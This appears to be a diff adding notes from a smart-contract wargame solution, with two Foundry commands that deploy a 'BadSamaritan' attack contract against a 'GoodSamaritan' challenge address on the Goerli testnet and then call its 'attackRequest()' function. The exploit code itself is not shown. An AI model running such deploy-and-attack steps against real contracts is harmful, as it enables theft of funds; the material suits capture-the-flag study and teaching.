@@ -1,0 +1,12 @@
+1. forge create src/27GoodSamaritan/Solution.sol:BadSamaritan \
+ --rpc-url https://goerli.infura.io/v3/{key} \
+ --private-key {key} \
+ --constructor-args 0xbF85e17AA860BfEbBf3E9052505b947Fc22C9390 \
+ --etherscan-api-key {key} \
+ --verify
+
+
+2. cast send 0xc425D1890a71f227E83156df6eB481827922F0Aa "attackRequest()" \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 
